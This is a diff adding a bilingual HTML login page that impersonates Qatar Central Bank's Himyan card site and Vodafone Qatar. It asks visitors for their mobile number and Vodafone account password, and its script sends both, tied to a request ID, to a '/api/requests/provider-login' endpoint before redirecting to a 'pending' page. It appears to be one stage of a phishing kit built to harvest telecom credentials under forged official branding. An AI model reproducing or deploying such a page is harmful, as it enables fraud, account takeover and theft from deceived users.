@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="تسجيل الدخول - فودافون قطر" />
+    <title>تسجيل الدخول - فودافون | هميان</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css" />
+    <style>
+        .provider-login {
+            max-width: 540px;
+            margin: 60px auto;
+            padding: 20px
+        }
+
+        .provider-brand {
+            text-align: center;
+            margin-bottom: 32px
+        }
+
+        .provider-logo {
+            font-size: 56px;
+            font-weight: 900;
+            color: #e60000;
+            margin-bottom: 12px
+        }
+
+        .provider-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #3d1827;
+            margin-bottom: 8px
+        }
+
+        .provider-subtitle {
+            font-size: 16px;
+            color: #6d6066
+        }
+
+        .login-form {
+            background: #fff;
+            border: 1px solid #e8dde2;
+            border-radius: 16px;
+            padding: 32px
+        }
+
+        .form-group {
+            margin-bottom: 20px
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 16px;
+            font-weight: 600;
+            color: #3d1827;
+            margin-bottom: 8px
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #d8c9cf;
+            border-radius: 8px;
+            font-family: inherit
+        }
+
+        .form-group input:focus {
+            outline: 2px solid rgba(138, 23, 59, .2);
+            border-color: #8a173b
+        }
+
+        .form-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 28px
+        }
+
+        .form-actions button,
+        .form-actions a {
+            flex: 1;
+            padding: 14px;
+            font-size: 16px;
+            text-align: center;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            font-family: inherit;
+            text-decoration: none;
+            display: block
+        }
+
+        .submit-btn {
+            background: #8a173b;
+            color: #fff
+        }
+
+        .submit-btn:hover {
+            background: #6d1230
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed
+        }
+
+        .cancel-btn {
+            background: #f8f5f6;
+            color: #6d6066
+        }
+
+        .cancel-btn:hover {
+            background: #e8dde2
+        }
+
+        .form-message {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center
+        }
+
+        .form-message.error {
+            background: #fef2f4;
+            color: #b52b49;
+            border: 1px solid #f4cbd3
+        }
+    </style>
+</head>
+
+<body class="success-page">
+    <header class="site-header">
+        <div class="header-top container">
+            <div class="mobile-controls"><button class="menu-toggle" type="button" aria-label="فتح القائمة"
+                    aria-expanded="false"
+                    aria-controls="main-navigation"><span></span><span></span><span></span></button><a
+                    class="mobile-language" href="#" data-language-switch>EN</a></div>
+            <a class="qcb-link" href="https://www.qcb.gov.qa" aria-label="مصرف قطر المركزي"><img class="qcb-logo"
+                    src="qcb-logo.svg" alt="مصرف قطر المركزي" /></a>
+            <a class="himyan-link" href="index.html#top" aria-label="هميان"><img class="himyan-logo" src="logo.svg"
+                    alt="هميان HIMYAN" /></a>
+        </div>
+        <nav id="main-navigation" class="main-navigation container" aria-label="القائمة الرئيسية"><a
+                href="index.html#top">عن هميان</a><a href="index.html#about">أهداف إصدار البطاقة</a><a
+                href="index.html#cards">مواصفات البطاقة</a><a href="index.html#advantages">مميزات البطاقة</a><a
+                href="index.html#cards">عروض البطاقة</a><a href="index.html#cards">الأخبار</a><a
+                href="index.html#cards">مصدرو البطاقة</a><a href="index.html#cards">الفئات المستهدفة</a><a
+                href="index.html#cards">إرشادات أمنية</a><a class="language" href="#" data-language-switch>EN</a></nav>
+    </header>
+    <main class="confirmation-main">
+        <section class="provider-login">
+            <div class="provider-brand">
+                <div class="provider-logo">Vodafone</div>
+                <h1 class="provider-title" id="page-title">تسجيل الدخول</h1>
+                <p class="provider-subtitle" id="page-subtitle">أدخل رقم الجوال وكلمة المرور الخاصة بحساب فودافون</p>
+            </div>
+            <form class="login-form" id="login-form">
+                <div class="form-group">
+                    <label for="mobile-input" id="mobile-label">رقم الجوال</label>
+                    <input type="tel" id="mobile-input" name="mobile" placeholder="+974 XXXX XXXX" dir="ltr"
+                        autocomplete="tel" required />
+                </div>
+                <div class="form-group">
+                    <label for="password-input" id="password-label">كلمة المرور</label>
+                    <input type="password" id="password-input" name="password" autocomplete="current-password"
+                        required />
+                </div>
+                <div class="form-actions">
+                    <button type="submit" class="submit-btn" id="submit-btn">تسجيل الدخول</button>
+                    <a href="network-provider.html" class="cancel-btn" id="cancel-btn">رجوع</a>
+                </div>
+                <div class="form-message error" id="form-message" style="display:none"></div>
+            </form>
+        </section>
+    </main>
+    <footer class="site-footer">
+        <div class="container footer-inner">
+            <p id="footer-rights">جميع الحقوق محفوظة © - مصرف قطر المركزي 2024</p>
+            <nav aria-label="روابط التذييل"><a href="index.html#top" id="footer-map">خريطة الموقع</a><a href="#"
+                    id="footer-legal">حقوق النشر وحدود المسئولية</a><a href="#" id="footer-privacy">الخصوصية</a></nav>
+        </div>
+    </footer>
+    <script>
+        const params = new URLSearchParams(window.location.search); const lang = params.get('lang') === 'en' ? 'en' : 'ar'; const requestId = params.get('requestId') || localStorage.getItem('himyan-request-id') || '';
+        const copy = lang === 'en' ? { title: 'Login', subtitle: 'Enter your mobile number and Vodafone account password', mobileLabel: 'Mobile Number', passwordLabel: 'Password', submit: 'Login', cancel: 'Back', errorMobile: 'Please enter a valid mobile number.', errorPassword: 'Please enter your password.', errorSubmit: 'Unable to submit login. Please try again.', missing: 'The request session has expired.', footer: 'All rights reserved © — Qatar Central Bank 2024', map: 'Sitemap', legal: 'Copyright and disclaimer', privacy: 'Privacy' } : { title: 'تسجيل الدخول', subtitle: 'أدخل رقم الجوال وكلمة المرور الخاصة بحساب فودافون', mobileLabel: 'رقم الجوال', passwordLabel: 'كلمة المرور', submit: 'تسجيل الدخول', cancel: 'رجوع', errorMobile: 'يرجى إدخال رقم جوال صحيح.', errorPassword: 'يرجى إدخال كلمة المرور.', errorSubmit: 'تعذر إرسال البيانات. يرجى المحاولة مرة أخرى.', missing: 'انتهت جلسة الطلب.', footer: 'جميع الحقوق محفوظة © - مصرف قطر المركزي 2024', map: 'خريطة الموقع', legal: 'حقوق النشر وحدود المسئولية', privacy: 'الخصوصية' };
+        document.documentElement.lang = lang; document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl'; document.title = copy.title + ' - Vodafone | Himyan'; document.querySelector('#page-title').textContent = copy.title; document.querySelector('#page-subtitle').textContent = copy.subtitle; document.querySelector('#mobile-label').textContent = copy.mobileLabel; document.querySelector('#password-label').textContent = copy.passwordLabel; document.querySelector('#submit-btn').textContent = copy.submit; document.querySelector('#cancel-btn').textContent = copy.cancel; document.querySelector('#footer-rights').textContent = copy.footer; document.querySelector('#footer-map').textContent = copy.map; document.querySelector('#footer-legal').textContent = copy.legal; document.querySelector('#footer-privacy').textContent = copy.privacy;
+        document.querySelectorAll('[data-language-switch]').forEach((switcher) => { switcher.textContent = lang === 'ar' ? 'EN' : 'AR'; switcher.addEventListener('click', (event) => { event.preventDefault(); const next = lang === 'ar' ? 'en' : 'ar'; const url = new URL(window.location.href); url.searchParams.set('lang', next); window.location.href = url.toString(); }); }); const menuToggle = document.querySelector('.menu-toggle'); const navigation = document.querySelector('.main-navigation'); menuToggle?.addEventListener('click', () => { const expanded = menuToggle.getAttribute('aria-expanded') === 'true'; menuToggle.setAttribute('aria-expanded', String(!expanded)); navigation?.classList.toggle('is-open', !expanded); });
+        document.querySelector('#login-form').addEventListener('submit', async (event) => { event.preventDefault(); const message = document.querySelector('#form-message'); const mobile = document.querySelector('#mobile-input').value.trim(); const password = document.querySelector('#password-input').value; message.style.display = 'none'; if (!mobile) { message.textContent = copy.errorMobile; message.style.display = 'block'; return; } if (!password) { message.textContent = copy.errorPassword; message.style.display = 'block'; return; } if (!requestId) { message.textContent = copy.missing; message.style.display = 'block'; return; } const submitBtn = document.querySelector('#submit-btn'); submitBtn.disabled = true; try { const response = await fetch('/api/requests/provider-login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: requestId, provider: 'vodafone', mobile, password }) }); if (!response.ok) throw new Error('submit failed'); window.location.href = `pending.html?lang=${lang}&stage=complete&requestId=${encodeURIComponent(requestId)}`; } catch { message.textContent = copy.errorSubmit; message.style.display = 'block'; submitBtn.disabled = false; } });
+    </script>
+</body>
+
+</html>
